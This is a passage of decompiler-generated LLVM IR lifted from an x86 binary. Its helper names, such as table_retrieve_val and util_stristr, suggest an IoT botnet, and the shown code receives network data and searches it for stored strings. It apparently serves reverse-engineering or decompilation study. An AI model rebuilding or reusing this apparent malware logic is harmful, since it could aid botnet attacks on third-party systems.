  %v4_804973f = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804973f, i32* @eax, align 4
  %v0_8049744 = load i32, i32* @esp, align 4
  %v1_8049744 = add i32 %v0_8049744, 112
  %v2_8049744 = inttoptr i32 %v1_8049744 to i32*
  %v3_8049744 = load i32, i32* %v2_8049744, align 4
  store i32 %v3_8049744, i32* %edx.global-to-local, align 4
  %v6_8049748 = icmp eq i32 %v0_8049744, -16
  store i1 %v6_8049748, i1* %zf.global-to-local, align 1
  %v2_804974b = add i32 %v4_804973f, 2116
  %v3_804974b = add i32 %v2_804974b, %v3_8049744
  %v4_804974b = inttoptr i32 %v3_804974b to i8*
  store i8 0, i8* %v4_804974b, align 1
  %v1_8049753.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049753

dec_label_pc_8049753:                             ; preds = %dec_label_pc_8049700, %dec_label_pc_8049736
  %v1_8049753 = phi i32 [ %v1_8049730, %dec_label_pc_8049700 ], [ %v1_8049753.pre, %dec_label_pc_8049736 ]
  %v0_8049753 = load i32, i32* @ecx, align 4
  %v2_8049753 = add i32 %v1_8049753, -4
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v0_8049754 = load i32, i32* @ecx, align 4
  %v2_8049754 = add i32 %v1_8049753, -8
  %v3_8049754 = inttoptr i32 %v2_8049754 to i32*
  store i32 %v0_8049754, i32* %v3_8049754, align 4
  %v1_8049755 = add i32 %v1_8049753, -12
  %v2_8049755 = inttoptr i32 %v1_8049755 to i32*
  store i32 16, i32* %v2_8049755, align 4
  %v0_8049757 = load i32, i32* @esi, align 4
  %v2_8049757 = add i32 %v1_8049753, -16
  %v3_8049757 = inttoptr i32 %v2_8049757 to i32*
  store i32 %v0_8049757, i32* %v3_8049757, align 4
  %v3_8049758 = call i32 @util_atoi(i8* %v1_8048f9a, i32 %v3_8048a9f)
  store i32 %v3_8049758, i32* %eax.global-to-local, align 4
  %v1_8049760 = icmp eq i32 %v3_8049758, 0
  store i1 %v1_8049760, i1* %zf.global-to-local, align 1
  br i1 %v1_8049760, label %dec_label_pc_8049d67, label %dec_label_pc_8049768

dec_label_pc_8049768:                             ; preds = %dec_label_pc_8049753
  %v1_8049768 = add i32 %v3_8049758, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v1_804976b = load i32, i32* @edi, align 4
  %v2_804976b = add i32 %v1_804976b, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804962b

dec_label_pc_8049773:                             ; preds = %dec_label_pc_8048c78
  %v2_8049773 = inttoptr i32 %v1_8048cb6 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_8049778 = urem i32 %v3_8049773, 32
  store i32 %v1_8049778, i32* %eax.global-to-local, align 4
  %v2_804977b = udiv i32 %v3_8049773, 32
  store i32 %v2_804977b, i32* %edx.global-to-local, align 4
  %v0_804977e = load i32, i32* @esp, align 4
  %v2_804977e = mul nuw nsw i32 %v2_804977b, 4
  %v3_804977e = add nuw nsw i32 %v2_804977e, 20740
  %v4_804977e = add i32 %v3_804977e, %v0_804977e
  %v5_804977e = inttoptr i32 %v4_804977e to i32*
  %v6_804977e = load i32, i32* %v5_804977e, align 4
  %v9_804977e = shl i32 1, %v1_8049778
  %v12_804977e = or i32 %v6_804977e, %v9_804977e
  store i32 %v12_804977e, i32* %v5_804977e, align 4
  %v0_8049786 = load i32, i32* @esi, align 4
  %v1_8049786 = add i32 %v0_8049786, -16
  %v2_8049786 = inttoptr i32 %v1_8049786 to i32*
  %v3_8049786 = load i32, i32* %v2_8049786, align 4
  store i32 %v3_8049786, i32* %eax.global-to-local, align 4
  %v1_8049789 = load i32, i32* @esp, align 4
  %v2_8049789 = add i32 %v1_8049789, 92
  %v3_8049789 = inttoptr i32 %v2_8049789 to i32*
  %v4_8049789 = load i32, i32* %v3_8049789, align 4
  %v5_8049789 = sub i32 %v3_8049786, %v4_8049789
  %v11_8049789 = xor i32 %v4_8049789, %v3_8049786
  %v12_8049789 = xor i32 %v5_8049789, %v3_8049786
  %v13_8049789 = and i32 %v12_8049789, %v11_8049789
  %v14_8049789 = icmp slt i32 %v13_8049789, 0
  %v15_8049789 = icmp eq i32 %v5_8049789, 0
  store i1 %v15_8049789, i1* %zf.global-to-local, align 1
  %v16_8049789 = icmp slt i32 %v5_8049789, 0
  %v3_804978d = icmp ne i1 %v16_8049789, %v14_8049789
  %v4_804978d = or i1 %v15_8049789, %v3_804978d
  br i1 %v4_804978d, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_8049798:                             ; preds = %dec_label_pc_8048c80
  %v2_8049798 = inttoptr i32 %v1_8048cb6 to i32*
  %v3_8049798 = load i32, i32* %v2_8049798, align 4
  %v1_804979d = urem i32 %v3_8049798, 32
  store i32 %v1_804979d, i32* %eax.global-to-local, align 4
  %v2_80497a0 = udiv i32 %v3_8049798, 32
  store i32 %v2_80497a0, i32* %edx.global-to-local, align 4
  %v0_80497a3 = load i32, i32* @esp, align 4
  %v2_80497a3 = mul nuw nsw i32 %v2_80497a0, 4
  %v3_80497a3 = add nuw nsw i32 %v2_80497a3, 20740
  %v4_80497a3 = add i32 %v3_80497a3, %v0_80497a3
  %v5_80497a3 = inttoptr i32 %v4_80497a3 to i32*
  %v6_80497a3 = load i32, i32* %v5_80497a3, align 4
  %v9_80497a3 = shl i32 1, %v1_804979d
  %v12_80497a3 = or i32 %v6_80497a3, %v9_80497a3
  store i32 %v12_80497a3, i32* %v5_80497a3, align 4
  %v0_80497ab = load i32, i32* @esi, align 4
  %v1_80497ab = add i32 %v0_80497ab, -16
  %v2_80497ab = inttoptr i32 %v1_80497ab to i32*
  %v3_80497ab = load i32, i32* %v2_80497ab, align 4
  store i32 %v3_80497ab, i32* %eax.global-to-local, align 4
  %v1_80497ae = load i32, i32* @esp, align 4
  %v2_80497ae = add i32 %v1_80497ae, 92
  %v3_80497ae = inttoptr i32 %v2_80497ae to i32*
  %v4_80497ae = load i32, i32* %v3_80497ae, align 4
  %v5_80497ae = sub i32 %v3_80497ab, %v4_80497ae
  %v11_80497ae = xor i32 %v4_80497ae, %v3_80497ab
  %v12_80497ae = xor i32 %v5_80497ae, %v3_80497ab
  %v13_80497ae = and i32 %v12_80497ae, %v11_80497ae
  %v14_80497ae = icmp slt i32 %v13_80497ae, 0
  %v15_80497ae = icmp eq i32 %v5_80497ae, 0
  store i1 %v15_80497ae, i1* %zf.global-to-local, align 1
  %v16_80497ae = icmp slt i32 %v5_80497ae, 0
  %v3_80497b2 = icmp ne i1 %v16_80497ae, %v14_80497ae
  %v4_80497b2 = or i1 %v15_80497ae, %v3_80497b2
  br i1 %v4_80497b2, label %dec_label_pc_8048ca2, label %dec_label_pc_8048dc4

dec_label_pc_80497bd:                             ; preds = %dec_label_pc_8048e5f
  %v0_80497bd = load i32, i32* @ebp, align 4
  %v2_80497bd = add i32 %v1_80497bd, -4
  %v3_80497bd = inttoptr i32 %v2_80497bd to i32*
  store i32 %v0_80497bd, i32* %v3_80497bd, align 4
  %v0_80497be = load i32, i32* @ebp, align 4
  %v2_80497be = add i32 %v1_80497bd, -8
  %v3_80497be = inttoptr i32 %v2_80497be to i32*
  store i32 %v0_80497be, i32* %v3_80497be, align 4
  %v1_80497bf = add i32 %v1_80497bd, -12
  %v2_80497bf = inttoptr i32 %v1_80497bf to i32*
  store i32 10240, i32* %v2_80497bf, align 4
  %v1_80497c4 = add i32 %v1_80497bd, 131
  store i32 %v1_80497c4, i32* %ecx.global-to-local, align 4
  %v2_80497cb = add i32 %v1_80497bd, -16
  %v3_80497cb = inttoptr i32 %v2_80497cb to i32*
  store i32 %v1_80497c4, i32* %v3_80497cb, align 4
  %v2_80497cc = call i32 @util_zero(i32 %stack_var_-20888.0, i32 %v3_8048a9f)
  %v0_80497d1 = load i32, i32* @esp, align 4
  %v1_80497d1 = add i32 %v0_80497d1, -4
  %v2_80497d1 = inttoptr i32 %v1_80497d1 to i32*
  store i32 16386, i32* %v2_80497d1, align 4
  %v1_80497d6 = add i32 %v0_80497d1, -8
  %v2_80497d6 = inttoptr i32 %v1_80497d6 to i32*
  store i32 10240, i32* %v2_80497d6, align 4
  %v1_80497db = add i32 %v0_80497d1, 147
  store i32 %v1_80497db, i32* %eax.global-to-local, align 4
  %v2_80497e2 = add i32 %v0_80497d1, -12
  %v3_80497e2 = inttoptr i32 %v2_80497e2 to i32*
  store i32 %v1_80497db, i32* %v3_80497e2, align 4
  %v0_80497e3 = load i32, i32* @edi, align 4
  %v1_80497e3 = add i32 %v0_80497e3, -1452
  %v2_80497e3 = inttoptr i32 %v1_80497e3 to i32*
  %v3_80497e3 = load i32, i32* %v2_80497e3, align 4
  store i32 %v3_80497e3, i32* @esi, align 4
  %v2_80497e9 = add i32 %v0_80497d1, -16
  %v3_80497e9 = inttoptr i32 %v2_80497e9 to i32*
  store i32 %v3_80497e3, i32* %v3_80497e9, align 4
  %v0_80497ea = call i32 @__libc_recv()
  store i32 %v0_80497ea, i32* @eax, align 4
  %v1_80497ef = load i32, i32* @esp, align 4
  %v2_80497ef = add i32 %v1_80497ef, 140
  %v3_80497ef = inttoptr i32 %v2_80497ef to i32*
  store i32 %v0_80497ea, i32* %v3_80497ef, align 4
  %v0_80497f6 = load i32, i32* @esp, align 4
  %v1_80497f9 = icmp eq i32 %v0_80497ea, 0
  store i1 %v1_80497f9, i1* %zf.global-to-local, align 1
  %tmp126 = icmp slt i32 %v0_80497ea, 1
  br i1 %tmp126, label %dec_label_pc_8049520, label %dec_label_pc_8049801

dec_label_pc_8049801:                             ; preds = %dec_label_pc_80497bd
  %v1_8049801 = add i32 %v0_80497f6, 28
  %v2_8049801 = inttoptr i32 %v1_8049801 to i32*
  store i32 4, i32* %v2_8049801, align 4
  %v1_8049803 = add i32 %v0_80497f6, 24
  %v2_8049803 = inttoptr i32 %v1_8049803 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055864.21 to i32), i32* %v2_8049803, align 4
  %v1_8049808 = add i32 %v0_80497f6, 140
  %v2_8049808 = inttoptr i32 %v1_8049808 to i32*
  %v3_8049808 = load i32, i32* %v2_8049808, align 4
  store i32 %v3_8049808, i32* @ebx, align 4
  %v2_804980c = add i32 %v0_80497f6, 20
  %v3_804980c = inttoptr i32 %v2_804980c to i32*
  store i32 %v3_8049808, i32* %v3_804980c, align 4
  %v1_804980d = add i32 %v0_80497f6, 163
  store i32 %v1_804980d, i32* %edx.global-to-local, align 4
  %v2_8049814 = add i32 %v0_80497f6, 16
  %v3_8049814 = inttoptr i32 %v2_8049814 to i32*
  store i32 %v1_804980d, i32* %v3_8049814, align 4
  %v4_8049815 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_804981a = load i32, i32* @esp, align 4
  %v1_804981d = add i32 %v4_8049815, 1
  %v8_804981d = icmp eq i32 %v1_804981d, 0
  store i1 %v8_804981d, i1* %zf.global-to-local, align 1
  store i32 %v1_804981d, i32* %eax.global-to-local, align 4
  %v1_804981e = icmp eq i1 %v8_804981d, false
  %.pre = add i32 %v0_804981a, 124
  %.pre83 = inttoptr i32 %.pre to i32*
  br i1 %v1_804981e, label %dec_label_pc_804982e, label %dec_label_pc_8049820

dec_label_pc_8049820:                             ; preds = %dec_label_pc_8049801
  %v3_8049820 = load i32, i32* %.pre83, align 4
  %v4_8049820 = add i32 %v3_8049820, -10239
  %v9_8049820 = sub i32 10238, %v3_8049820
  %v10_8049820 = and i32 %v9_8049820, %v3_8049820
  %v11_8049820 = icmp slt i32 %v10_8049820, 0
  %v12_8049820 = icmp eq i32 %v4_8049820, 0
  store i1 %v12_8049820, i1* %zf.global-to-local, align 1
  %v13_8049820 = icmp slt i32 %v4_8049820, 0
  %v3_8049828 = icmp ne i1 %v13_8049820, %v11_8049820
  %v4_8049828 = or i1 %v12_8049820, %v3_8049828
  br i1 %v4_8049828, label %dec_label_pc_8048e80, label %dec_label_pc_804982e

dec_label_pc_804982e:                             ; preds = %dec_label_pc_8049801, %dec_label_pc_8049820
  %v1_804982e = add i32 %v0_804981a, 12
  %v2_804982e = inttoptr i32 %v1_804982e to i32*
  store i32 4, i32* %v2_804982e, align 4
  %v1_8049830 = add i32 %v0_804981a, 8
  %v2_8049830 = inttoptr i32 %v1_8049830 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8055864.21 to i32), i32* %v2_8049830, align 4
  %v3_8049835 = load i32, i32* %.pre83, align 4
  %v2_8049839 = add i32 %v0_804981a, 4
  %v3_8049839 = inttoptr i32 %v2_8049839 to i32*
  store i32 %v3_8049835, i32* %v3_8049839, align 4
  %v1_804983a = add i32 %v0_804981a, 147
  store i32 %v1_804983a, i32* %ecx.global-to-local, align 4
  %v3_8049841 = inttoptr i32 %v0_804981a to i32*
  store i32 %v1_804983a, i32* %v3_8049841, align 4
  %v4_8049842 = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049842, i32* %eax.global-to-local, align 4
  %v0_8049847 = load i32, i32* @esp, align 4
  %v2_8049847 = add i32 %v4_8049842, 147
  %v3_8049847 = add i32 %v2_8049847, %v0_8049847
  %v4_8049847 = inttoptr i32 %v3_8049847 to i8*
  store i8 0, i8* %v4_8049847, align 1
  %v0_804984f = load i32, i32* @esp, align 4
  %v1_804984f = inttoptr i32 %v0_804984f to i32*
  %v2_804984f = load i32, i32* %v1_804984f, align 4
  store i32 %v2_804984f, i32* %eax.global-to-local, align 4
  %v3_804984f = add i32 %v0_804984f, 4
  %v1_8049850 = inttoptr i32 %v3_804984f to i32*
  %v2_8049850 = load i32, i32* %v1_8049850, align 4
  store i32 %v2_8049850, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v1_8049850, align 4
  store i32 53, i32* %v1_804984f, align 4
  %v3_8049855 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049855, i32* %eax.global-to-local, align 4
  %v0_804985a = load i32, i32* @esp, align 4
  %v9_804985a = icmp eq i32 %v0_804985a, -12
  store i1 %v9_804985a, i1* %zf.global-to-local, align 1
  %v2_804985d = add i32 %v0_804985a, 8
  %v3_804985d = inttoptr i32 %v2_804985d to i32*
  store i32 %v3_8049855, i32* %v3_804985d, align 4
  %v1_804985e = add i32 %v0_804985a, 124
  %v2_804985e = inttoptr i32 %v1_804985e to i32*
  %v3_804985e = load i32, i32* %v2_804985e, align 4
  %v2_8049862 = add i32 %v0_804985a, 4
  %v3_8049862 = inttoptr i32 %v2_8049862 to i32*
  store i32 %v3_804985e, i32* %v3_8049862, align 4
  %v1_8049863 = add i32 %v0_804985a, 147
  store i32 %v1_8049863, i32* %eax.global-to-local, align 4
  %v3_804986a = inttoptr i32 %v0_804985a to i32*
  store i32 %v1_8049863, i32* %v3_804986a, align 4
  %v4_804986b = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_8049870 = load i32, i32* @esp, align 4
  %v1_8049870 = add i32 %v0_8049870, 16
  %v1_8049873 = add i32 %v4_804986b, 1
  %v8_8049873 = icmp eq i32 %v1_8049873, 0
  store i1 %v8_8049873, i1* %zf.global-to-local, align 1
  store i32 %v1_8049873, i32* %eax.global-to-local, align 4
  br i1 %v8_8049873, label %dec_label_pc_804987c, label %dec_label_pc_8049876

dec_label_pc_8049876:                             ; preds = %dec_label_pc_804982e
  %v0_8049876 = load i32, i32* @edi, align 4
  %v1_8049876 = inttoptr i32 %v0_8049876 to i32*
  store i32 2, i32* %v1_8049876, align 4
  %v1_804987c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804987c

dec_label_pc_804987c:                             ; preds = %dec_label_pc_804982e, %dec_label_pc_8049876
  %v1_804987c = phi i32 [ %v1_8049870, %dec_label_pc_804982e ], [ %v1_804987c.pre, %dec_label_pc_8049876 ]
  %v0_804987c = load i32, i32* @ebp, align 4
  %v2_804987c = add i32 %v1_804987c, -4
  %v3_804987c = inttoptr i32 %v2_804987c to i32*
  store i32 %v0_804987c, i32* %v3_804987c, align 4
  %v0_804987d = load i32, i32* @ebp, align 4
  %v2_804987d = add i32 %v1_804987c, -8
  %v3_804987d = inttoptr i32 %v2_804987d to i32*
  store i32 %v0_804987d, i32* %v3_804987d, align 4
  %v1_804987e = add i32 %v1_804987c, -12
  %v2_804987e = inttoptr i32 %v1_804987e to i32*
  store i32 0, i32* %v2_804987e, align 4
  %v1_8049880 = add i32 %v1_804987c, -16
  %v2_8049880 = inttoptr i32 %v1_8049880 to i32*
  store i32 52, i32* %v2_8049880, align 4
  %v3_8049882 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049882, i32* %eax.global-to-local, align 4
  %v0_8049887 = load i32, i32* @esp, align 4
  %v9_8049887 = icmp eq i32 %v0_8049887, -12
  store i1 %v9_8049887, i1* %zf.global-to-local, align 1
  %v2_804988a = add i32 %v0_8049887, 8
  %v3_804988a = inttoptr i32 %v2_804988a to i32*
  store i32 %v3_8049882, i32* %v3_804988a, align 4
  %v1_804988b = add i32 %v0_8049887, 124
  %v2_804988b = inttoptr i32 %v1_804988b to i32*
  %v3_804988b = load i32, i32* %v2_804988b, align 4
  store i32 %v3_804988b, i32* @esi, align 4
  %v2_804988f = add i32 %v0_8049887, 4
  %v3_804988f = inttoptr i32 %v2_804988f to i32*
  store i32 %v3_804988b, i32* %v3_804988f, align 4
  %v1_8049890 = add i32 %v0_8049887, 147
  store i32 %v1_8049890, i32* @edx, align 4
  %v3_8049897 = inttoptr i32 %v0_8049887 to i32*
  store i32 %v1_8049890, i32* %v3_8049897, align 4
  %v4_8049898 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v1_80498a0 = add i32 %v4_8049898, 1
  %v8_80498a0 = icmp eq i32 %v1_80498a0, 0
  store i1 %v8_80498a0, i1* %zf.global-to-local, align 1
  store i32 %v1_80498a0, i32* %eax.global-to-local, align 4
  br i1 %v8_80498a0, label %dec_label_pc_80498a9, label %dec_label_pc_80498a3

dec_label_pc_80498a3:                             ; preds = %dec_label_pc_804987c
  %v0_80498a3 = load i32, i32* @edi, align 4
  %v1_80498a3 = inttoptr i32 %v0_80498a3 to i32*
  store i32 1, i32* %v1_80498a3, align 4
  br label %dec_label_pc_80498a9

dec_label_pc_80498a9:                             ; preds = %dec_label_pc_804987c, %dec_label_pc_80498a3
  %v0_80498a9 = load i32, i32* @edi, align 4
  %v1_80498a9 = add i32 %v0_80498a9, 4
  %v2_80498a9 = inttoptr i32 %v1_80498a9 to i32*
  store i32 0, i32* %v2_80498a9, align 4
  %v0_80498b0 = load i32, i32* @ebx, align 4
  %v1_80498b0 = load i32, i32* @esp, align 4
  %v2_80498b0 = add i32 %v1_80498b0, -4
  %v3_80498b0 = inttoptr i32 %v2_80498b0 to i32*
  store i32 %v0_80498b0, i32* %v3_80498b0, align 4
  %v0_80498b1 = load i32, i32* @ebx, align 4
  %v2_80498b1 = add i32 %v1_80498b0, -8
  %v3_80498b1 = inttoptr i32 %v2_80498b1 to i32*
  store i32 %v0_80498b1, i32* %v3_80498b1, align 4
  %v1_80498b2 = add i32 %v1_80498b0, -12
  %v2_80498b2 = inttoptr i32 %v1_80498b2 to i32*
  store i32 0, i32* %v2_80498b2, align 4
  %v1_80498b4 = add i32 %v1_80498b0, -16
  %v2_80498b4 = inttoptr i32 %v1_80498b4 to i32*
  store i32 51, i32* %v2_80498b4, align 4
  %v3_80498b6 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80498b6, i32* %eax.global-to-local, align 4
  %v0_80498bb = load i32, i32* @esp, align 4
  %v9_80498bb = icmp eq i32 %v0_80498bb, -12
  store i1 %v9_80498bb, i1* %zf.global-to-local, align 1
  %v2_80498be = add i32 %v0_80498bb, 8
  %v3_80498be = inttoptr i32 %v2_80498be to i32*
  store i32 %v3_80498b6, i32* %v3_80498be, align 4
  %v1_80498bf = add i32 %v0_80498bb, 124
  %v2_80498bf = inttoptr i32 %v1_80498bf to i32*
  %v3_80498bf = load i32, i32* %v2_80498bf, align 4
  %v2_80498c3 = add i32 %v0_80498bb, 4
  %v3_80498c3 = inttoptr i32 %v2_80498c3 to i32*
  store i32 %v3_80498bf, i32* %v3_80498c3, align 4
  %v1_80498c4 = add i32 %v0_80498bb, 147
  store i32 %v1_80498c4, i32* @ecx, align 4
  %v3_80498cb = inttoptr i32 %v0_80498bb to i32*
  store i32 %v1_80498c4, i32* %v3_80498cb, align 4
  %v4_80498cc = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  %v0_80498d1 = load i32, i32* @esp, align 4
  %v1_80498d4 = add i32 %v4_80498cc, 1
  %v8_80498d4 = icmp eq i32 %v1_80498d4, 0
  store i1 %v8_80498d4, i1* %zf.global-to-local, align 1
  store i32 %v1_80498d4, i32* %eax.global-to-local, align 4
  br i1 %v8_80498d4, label %dec_label_pc_8049980, label %dec_label_pc_80498db

dec_label_pc_80498db:                             ; preds = %dec_label_pc_80498a9
  %v0_80498db = load i32, i32* @edx, align 4
  %v2_80498db = add i32 %v0_80498d1, 12
  %v3_80498db = inttoptr i32 %v2_80498db to i32*
  store i32 %v0_80498db, i32* %v3_80498db, align 4
  %v0_80498dc = load i32, i32* @edx, align 4
  %v2_80498dc = add i32 %v0_80498d1, 8
  %v3_80498dc = inttoptr i32 %v2_80498dc to i32*
  store i32 %v0_80498dc, i32* %v3_80498dc, align 4
  %v1_80498dd = add i32 %v0_80498d1, 4
  %v2_80498dd = inttoptr i32 %v1_80498dd to i32*
  store i32 0, i32* %v2_80498dd, align 4
  %v2_80498df = inttoptr i32 %v0_80498d1 to i32*
  store i32 51, i32* %v2_80498df, align 4
  %v3_80498e1 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_80498e1, i32* %eax.global-to-local, align 4
  %v0_80498e6 = load i32, i32* @esp, align 4
  %v9_80498e6 = icmp eq i32 %v0_80498e6, -12
  store i1 %v9_80498e6, i1* %zf.global-to-local, align 1
  %v2_80498e9 = add i32 %v0_80498e6, 8
  %v3_80498e9 = inttoptr i32 %v2_80498e9 to i32*
  store i32 %v3_80498e1, i32* %v3_80498e9, align 4
  %v1_80498ea = add i32 %v0_80498e6, 124
  %v2_80498ea = inttoptr i32 %v1_80498ea to i32*
  %v3_80498ea = load i32, i32* %v2_80498ea, align 4
  %v2_80498ee = add i32 %v0_80498e6, 4
  %v3_80498ee = inttoptr i32 %v2_80498ee to i32*
  store i32 %v3_80498ea, i32* %v3_80498ee, align 4
  %v1_80498ef = add i32 %v0_80498e6, 147
  store i32 %v1_80498ef, i32* %eax.global-to-local, align 4
  %v3_80498f6 = inttoptr i32 %v0_80498e6 to i32*
  store i32 %v1_80498ef, i32* %v3_80498f6, align 4
  %v4_80498f7 = call i32 @util_stristr(i8* %v1_8048f9a, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80498f7, i32* %eax.global-to-local, align 4
  %v0_80498fc = load i32, i32* @esp, align 4
  %v6_80498fc = icmp eq i32 %v0_80498fc, -16
  store i1 %v6_80498fc, i1* %zf.global-to-local, align 1
  store i32 %v4_80498f7, i32* %ebx.global-to-local, align 4
  %v2_8049901 = add i32 %v4_80498f7, 147
  %v3_8049901 = add i32 %v2_8049901, %v0_80498fc
  %v4_8049901 = inttoptr i32 %v3_8049901 to i8*
  %v5_8049901 = load i8, i8* %v4_8049901, align 1
  %v11_8049901 = icmp eq i8 %v5_8049901, 32
  %v1_8049909 = zext i1 %v11_8049901 to i32
  %v1_804990c = add i32 %v0_80498fc, 147
  store i32 %v1_804990c, i32* %esi.global-to-local, align 4
  store i32 %v1_8049909, i32* %eax.global-to-local, align 4
  %v1_8049918 = add i32 %v0_80498fc, 12
  %v2_8049918 = inttoptr i32 %v1_8049918 to i32*
  store i32 2, i32* %v2_8049918, align 4
  %v1_804991a = add i32 %v0_80498fc, 8
  %v2_804991a = inttoptr i32 %v1_804991a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8055866.17 to i32), i32* %v2_804991a, align 4
  %v0_804991f = load i32, i32* %ebx.global-to-local, align 4
  %v1_804991f = load i32, i32* %eax.global-to-local, align 4
  %v2_804991f = add i32 %v1_804991f, %v0_804991f
  store i32 %v2_804991f, i32* @ebx, align 4
  %v1_8049921 = add i32 %v0_80498fc, 124
  %v2_8049921 = inttoptr i32 %v1_8049921 to i32*
  %v3_8049921 = load i32, i32* %v2_8049921, align 4
  %v2_8049925 = sub i32 %v3_8049921, %v2_804991f
  store i32 %v2_8049925, i32* %eax.global-to-local, align 4
  %v0_8049927 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049927 = add i32 %v0_8049927, %v2_804991f
  %v12_8049927 = icmp eq i32 %v2_8049927, 0
  store i1 %v12_8049927, i1* %zf.global-to-local, align 1
  store i32 %v2_8049927, i32* @esi, align 4
  %v2_8049929 = add i32 %v0_80498fc, 4
  %v3_8049929 = inttoptr i32 %v2_8049929 to i32*
  store i32 %v2_8049925, i32* %v3_8049929, align 4
  %v0_804992a = load i32, i32* @esi, align 4
  %v3_804992a = inttoptr i32 %v0_80498fc to i32*
  store i32 %v0_804992a, i32* %v3_804992a, align 4
  %v4_804992b = call i32 @util_memsearch(i32 %stack_var_-20888.0, i32 %v3_8048a9f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804992b, i32* %eax.global-to-local, align 4
  %v0_8049930 = load i32, i32* @esp, align 4
  %v10_8049933 = icmp eq i32 %v4_804992b, -1
  store i1 %v10_8049933, i1* %zf.global-to-local, align 1
  br i1 %v10_8049933, label %dec_label_pc_8049980, label %dec_label_pc_8049938

dec_label_pc_8049938:                             ; preds = %dec_label_pc_80498db
  %v10_8049938 = icmp eq i32 %v4_804992b, 1
  store i1 %v10_8049938, i1* %zf.global-to-local, align 1
  %v7_804993b = icmp sgt i32 %v4_804992b, 1
  br i1 %v7_804993b, label %dec_label_pc_804993d, label %dec_label_pc_8049940

dec_label_pc_804993d:                             ; preds = %dec_label_pc_8049938
  %v1_804993d = add i32 %v4_804992b, -2
  %v9_804993d = icmp eq i32 %v1_804993d, 0
  store i1 %v9_804993d, i1* %zf.global-to-local, align 1
  store i32 %v1_804993d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049940

dec_label_pc_8049940:                             ; preds = %dec_label_pc_8049938, %dec_label_pc_804993d
  %v1_8049947 = phi i32 [ %v4_804992b, %dec_label_pc_8049938 ], [ %v1_804993d, %dec_label_pc_804993d ]
  %v1_8049940 = add i32 %v0_8049930, 20920
  store i32 %v1_8049940, i32* %edx.global-to-local, align 4
  %v2_8049947 = add i32 %v1_8049947, %v1_8049940
  store i32 %v2_8049947, i32* %eax.global-to-local, align 4
  %v0_804994a = load i32, i32* @ebx, align 4
  %v2_804994a = add i32 %v2_8049947, -20773
  %v3_804994a = add i32 %v2_804994a, %v0_804994a
  %v4_804994a = inttoptr i32 %v3_804994a to i8*
  store i8 0, i8* %v4_804994a, align 1
  %v0_8049952 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049952 = load i32, i32* @esp, align 4
  %v2_8049952 = add i32 %v1_8049952, -4
  %v3_8049952 = inttoptr i32 %v2_8049952 to i32*
  store i32 %v0_8049952, i32* %v3_8049952, align 4
  %v0_8049953 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049953 = add i32 %v1_8049952, -8
  %v3_8049953 = inttoptr i32 %v2_8049953 to i32*
  store i32 %v0_8049953, i32* %v3_8049953, align 4
  %v1_8049954 = add i32 %v1_8049952, -12
  %v2_8049954 = inttoptr i32 %v1_8049954 to i32*
  store i32 0, i32* %v2_8049954, align 4
  %v1_8049956 = add i32 %v1_8049952, -16
  %v2_8049956 = inttoptr i32 %v1_8049956 to i32*
  store i32 50, i32* %v2_8049956, align 4
  %v3_8049958 = call i32 @table_retrieve_val(i32 %stack_var_-20888.0, i32* %v2_80490ce)
  store i32 %v3_8049958, i32* %eax.global-to-local, align 4
  %v0_804995d = load i32, i32* @esi, align 4
  %v1_804995d = load i32, i32* @esp, align 4
  %v2_804995d = inttoptr i32 %v1_804995d to i32*
  store i32 %v0_804995d, i32* %v2_804995d, align 4
  store i32 %v3_8049958, i32* @ebx, align 4
  %v2_8049962 = call i32 @util_strlen(i8* %v1_8048f9a)
  store i32 %v2_8049962, i32* %eax.global-to-local, align 4
  %v0_8049967 = load i32, i32* @esp, align 4
  %v9_8049967 = icmp eq i32 %v0_8049967, -12
  store i1 %v9_8049967, i1* %zf.global-to-local, align 1
  %v0_804996a = load i32, i32* @ebx, align 4
  %v2_804996a = add i32 %v0_8049967, 8
  %v3_804996a = inttoptr i32 %v2_804996a to i32*
  store i32 %v0_804996a, i32* %v3_804996a, align 4
  %v2_804996b = add i32 %v0_8049967, 4
  %v3_804996b = inttoptr i32 %v2_804996b to i32*
